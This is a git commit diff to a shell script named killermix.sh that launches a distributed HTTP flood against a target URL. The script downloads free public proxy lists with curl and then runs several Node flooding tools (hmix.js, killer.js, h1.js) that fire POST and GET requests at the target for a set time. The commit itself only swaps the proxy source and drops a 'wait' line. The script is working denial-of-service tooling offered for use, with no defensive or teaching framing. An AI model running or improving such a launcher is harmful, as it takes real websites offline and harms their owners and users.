cbd63bfd8110962de605738d9f0b641ca0ed3658
hackerlove123 <149338972+hackerlove123@users.noreply.github.com>
2025-04-15 17:03:19 +0700

    her

--- killermix.sh
+++ killermix.sh
@@ -5,10 +5,12 @@
 
 URL=$1
 TIME=$2
-# https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/${type}/Vietnam.txt
+#"https://raw.githubusercontent.com/SoliSpirit/proxy-list/refs/heads/main/Countries/${type}/Vietnam.txt"
+#"https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/${type}.txt"
+#"https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=99999&protocol=${type}"
 # Tải proxy loại HTTP, HTTPS, SOCKS4, SOCKS5 vào live.txt 
-for type in http https socks4 socks5; do
-  curl -s "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=99999&protocol=${type}"
+for type in http https; do
+  curl -s "https://raw.githubusercontent.com/Zaeem20/FREE_PROXIES_LIST/refs/heads/master/${type}.txt"
 done > live.txt
 
 node hmix.js -m POST -u "$URL" -s "$TIME" -p live.txt -t 1 --full true -d false &
@@ -18,6 +20,4 @@ node killer.js POST "$URL" "$TIME" 1 1 live.txt --query 1 --referer rand --http 
 node h1.js POST "$URL" live.txt "$TIME" 999 10 randomstring="true" &
 node h1.js GET "$URL" live.txt "$TIME" 999 10 randomstring="true" &
 
-
-wait
 pkill -f "hmix.js|h1.js|h1h2.js|http2.js|h1version.js|killer.js"
